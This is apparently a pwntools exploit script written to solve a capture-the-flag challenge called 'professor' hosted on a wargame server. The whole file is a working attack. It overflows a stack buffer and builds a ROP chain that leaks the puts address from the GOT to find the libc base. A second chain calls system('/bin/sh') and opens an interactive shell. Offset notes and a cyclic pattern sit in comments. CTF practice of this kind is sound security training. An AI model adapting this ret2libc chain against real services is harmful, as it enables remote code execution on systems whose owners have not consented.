#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./professor')

host = args.HOST or 'pwnable.co.il'
port = int(args.PORT or 9003)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

#libc_base = 0x00007ffff7da6000 #exe.libc.address 
#system_addr = libc_base + 0x522c0 #exe.libc.symbols['system']
#binsh_addr = libc_base + 0x1b45bd #next(exe.libc.search(b'/bin/sh')) #libc_base + 0x1b45bd
rop_helper = 0x401393

io = start()

rop = ROP(exe)
rop.raw('A' * 0x38)
rop.puts(exe.got['puts'])
rop.raw(exe.sym['start_routine'])
rop.raw('A' * 0x828)

io.sendline(rop.chain())

puts_leak = u64(io.recv(6)+b"\x00")

exe.libc.address = puts_leak - exe.libc.sym['system']

binsh = next(exe.libc.search(b'/bin/sh\x00'))

rop = ROP(exe.libc)
rop.raw('A' * 0x38)
rop.raw(rop_helper)
rop.system(binsh)

#payload = b'A' * 0x38 + p64(rop_helper) + p64(binsh_addr) + p64(system_addr) + b'A' * 0x820

io.sendline(rop.chain())

io.interactive()

#aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaafdaaaaaafeaaaaaaffaaaaaafgaaaaaafhaaaaaafiaaaaaafjaaaaaafkaaaaaaflaaaaaafmaaaaaafnaaaaaafoaaaaaafpaaaaaafqaaaaaafraaaaaafsaaaaaaftaaaaaafuaaaaaafvaaaaaafwaaaaaafxaaaaaafyaaaaaafzaaaaaagbaaaaaagcaaaaaagdaaaaaageaaaaaagfaaaaaaggaaaaaaghaaaaaagiaaaaaagjaaaaaagkaaaaaaglaaaaaagmaaaaaagnaaaaaagoaaaaaagpaaaaaagqaaaaaagraaaaaagsaaaaaagtaaaaaaguaaaaaagvaaaaaagwaaaaaagxaaaaaagyaaaaaagzaaaaaahbaaaaaahcaaaaaahdaaaaaaheaaaaaahfaaaaaahgaaaaaahhaaaaaahiaaaaaahjaaaaaahkaaaaaahlaaaaaahmaaaaaahnaaaaaahoaaaaaahpaaaaaahqaaaaaahraaaaaahsaaaaaahtaaaaaahuaaaaaahvaaaaaahwaaaaaahxaaaaaahyaaaaaahzaaaaaaibaaaaaaicaaaaaaidaaaaaaieaaaaaaifaaaaaaigaaaaaaihaaaaaaiiaaaaaaijaaaaaaikaaaaaailaaaaaaimaaaaaainaaaaaaioaaaaaaipaaaaaaiqaaaaaairaaaaaaisaaaaaaitaaaaaaiuaaaaaaivaaaaaaiwaaaaaaixaaaaaaiyaaaaaaizaaaaaajbaaaaaajcaaaaaajdaaaaaajeaaaaaajfaaaaaajgaaaaaajhaaaaaajiaaaaaajjaaaaaajkaaaaaajlaaaaaajmaaaaaajnaaaaaajoaaaaaajpaaaaaajqaaaaaajraaaaaajsaaaaaajtaaaaaajuaaaaaajvaaaaaajwaaaaaajxaaaaaajyaaaaaajzaaaaaakbaaaaaakcaaaaaakdaaaaaakeaaaaaakfaaaaaakgaaaaaakhaaaaaakiaaaaaakjaaaaaakkaaaaaaklaaaaaakmaaaaaaknaaaaaakoaaaaaakpaaaaaakqaaaaaakraaaaaaksaaaaaaktaaaaaak

# 0x868 - fs:28
# 0x38 - ret addr
# 0x28 - canary 